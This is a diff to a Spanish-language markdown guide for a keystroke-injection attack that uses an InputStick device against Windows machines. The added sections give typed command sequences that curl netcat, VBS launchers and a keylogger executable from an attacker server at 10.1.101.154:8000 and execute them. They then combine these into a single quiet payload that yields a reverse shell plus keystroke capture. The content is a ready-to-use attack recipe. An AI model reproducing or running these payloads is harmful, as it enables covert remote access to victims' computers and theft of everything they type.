@@ -28,6 +28,7 @@ cmd.exe
 curl http://0.0.0.0:8000/nc64.exe -o nc64.exe
 curl http://0.0.0.0:8000/i.vbs -o i.vbs
 i.vbs
+exit
 #Entre cada comanda se envía una señal de presionar la tecla Enter
 ```
 Con todo esto ya recibiremos la conexión con su terminal.
@@ -48,3 +49,39 @@ WshShell.Run "keylogger.py", 0, False
 
 - Script keylogger.py: [Ver Script](./scripts/keylogger.py)
 - [Autor del Script](https://github.com/Maalfer)
+
+Importante que el Script del KeyLogger tiene que ser ejecutable por el sistema objetivo.
+
+Una vez todo preparado ya podemos configurar las comandas y teclas desde la App de InputStick.
+
+```bash
+Windows +r
+cmd.exe
+curl http://10.1.101.154:8000/keylogger.exe -o keylogger.exe
+curl http://10.1.101.154:8000/a.vbs -o a.vbs
+a.vbs
+exit
+#Entre comandas envíamos señales de presionar la tecla Enter
+```
+
+### Objetivo conseguido
+
+Una vez hemos conseguido la ReverseShell en funcionamiento y hemos conseguido un buen resultado con el KeyLogger, podemos combinar las dos cosas. En nuestro caso hemos combinado las comandas y combianciones de teclas envíadas por la App de InputStick, manteniendo el menor ruido posible.
+
+```bash
+Windows +r
+cmd.exe
+curl http://10.1.101.154:8000/nc64.exe -o nc64.exe
+curl http://10.1.101.154:8000/i.vbs -o i.vbs
+curl http://10.1.101.154:8000/keylogger.exe -o keylogger.exe
+curl http://10.1.101.154:8000/a.vbs -o a.vbs
+i.vbs
+a.vbs
+exit
+#Entre comandas envíamos señales de presionar la tecla Enter
+```
+
+### Agradecimientos:
+
+- [ViejoFraile](https://www.youtube.com/channel/UCjEd3L5Rs8qfvA92ADvchAw)
+- [El Pinguino de Mario](https://www.youtube.com/@ElPinguinoDeMario)
